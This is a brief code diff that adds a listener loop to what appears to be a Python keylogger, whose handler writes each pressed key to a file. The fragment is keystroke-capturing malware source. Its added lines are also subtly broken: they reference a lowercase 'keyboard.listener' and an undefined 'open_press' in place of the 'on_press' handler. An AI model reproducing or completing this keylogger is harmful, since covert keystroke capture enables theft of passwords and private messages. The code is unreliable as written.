@@ -33,3 +33,7 @@ def on_press(key):
         pass
       else:
         f.write(f"[{key}] ")
+with keyboard.listener(on_press=open_press) as listener:
+  listener.join()
+
+
